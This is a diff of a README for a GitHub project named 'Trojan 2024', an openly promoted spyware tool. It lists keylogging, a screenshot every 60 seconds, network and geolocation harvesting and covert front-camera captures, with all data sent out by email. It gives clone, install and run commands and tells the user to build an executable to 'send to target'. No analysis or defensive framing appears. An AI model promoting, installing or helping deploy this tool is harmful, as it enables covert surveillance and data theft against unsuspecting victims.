@@ -1,7 +1,7 @@
 Trojan 2024: A Multi-Platform Information Gathering Script .
 
 Features :
-===========
+=======
 Screenshots
 Keystrokes
 Hardware and network information
@@ -10,35 +10,24 @@ Front camera captures
 All data is securely delivered via email for your convenience.
 
 Key Features
-============
+=======
 Screenshot Capture: Automatically captures desktop activity every 60 seconds.
-============
 Keylogging: Records typed text at configurable intervals.
-============
 Hardware Information: Retrieves details like CPU, GPU, and RAM specs.
-============
 Network Data: Captures IP addresses, MAC addresses, and more.
-============
 Geolocation Tracking: Provides approximate location details.
-============
 Camera Access: Takes images using the front camera (if available).
-============
 
 
+How to install .
+=====
 Installation and Setup
-=============
 Windows
-=============
 Open PowerShell or Command Prompt.
-=============
 git clone https://github.com/BlackNode-stack/2024Trojan.git
-=============
 cd 2024Trojan
-=============
 pip install -r requirements.txt
-=============
 python Run.py
-=============
 
 Generate a standalone executable so you can send to target .
 
